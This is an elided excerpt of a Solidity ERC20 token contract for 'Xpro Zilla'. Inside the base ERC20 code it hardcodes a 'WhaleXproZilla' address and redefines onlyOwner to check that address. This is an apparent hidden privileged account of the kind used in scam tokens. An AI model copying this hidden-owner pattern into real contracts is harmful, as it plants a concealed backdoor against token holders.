...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XproZillawebsite = "https://www.XproZilla.land/";
    string public XproZillaADDRESS = "0x1c9c003ead9C8e43bdd7917D0deb4C236E52c0Ca";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXproZilla;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXproZilla = 0x1c9c003ead9C8e43bdd7917D0deb4C236E52c0Ca;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXproZillawebsite() public view returns (string memory) {
        return XproZillawebsite;
    } 


               function getXproZillaADDRESS() public view returns (string memory) {
        return XproZillaADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXproZilla);
        _;
    }    
    function _approve(
        address owner,
...
contract XproZilla is ERC20, Ownable {
    constructor () ERC20("Xpro Zilla", "XPROZ") 
    {    
        firstBlock(msg.sender, 1_000000000000000 * (10 ** 9));
    }
}